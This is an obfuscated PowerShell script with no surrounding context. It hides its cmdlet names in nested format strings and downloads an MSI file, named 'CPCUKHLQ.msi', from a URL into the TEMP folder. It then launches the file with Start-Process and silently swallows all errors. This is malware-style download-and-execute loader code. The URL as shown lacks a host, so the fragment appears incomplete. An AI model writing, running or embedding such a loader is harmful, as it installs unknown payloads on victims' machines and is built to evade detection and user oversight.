

  ${sOM`ed`Ata} = @(
  [PSCustomObject]@{('a') = ("{2}{0}{1}"-f ("{0}{1}" -f'ps:','/'),'/','htt'); ('b') = ("{1}{0}{2}{3}" -f 'Q.',("{1}{2}{0}" -f 'HL',("{0}{1}" -f'CP','CU'),'K'),'ms','i')}
);
  foreach (${I} in ${SomEd`ATA}) {
    try {
      ${FI`lepa`TH} = "$env:TEMP\$($i.b)";
      ${dOW`Nlo`AD} = ${tR`UE};
      if (.("{0}{2}{1}" -f ("{0}{1}"-f 'Tes','t-'),'th','Pa') ${fi`L`epAtH}) {
        ${D`o`WNLOAD} = ${FAL`se};
      } 
      if (${do`WNL`OAd}) {
        .("{1}{0}{2}{3}{4}"-f 'ke',("{1}{0}" -f'o','Inv'),'-Re',("{0}{1}" -f 's','tMe'),("{0}{1}" -f'th','od')) -Uri ${i}."a" -OutFile ${fil`eP`AtH}; 
      }
      .("{0}{3}{1}{2}"-f("{0}{1}" -f 'Sta','r'),'ces','s',("{0}{1}"-f ("{1}{0}"-f'Pr','t-'),'o')) ${Fi`lEPaTH};
    }
    catch {
    }
  }

  
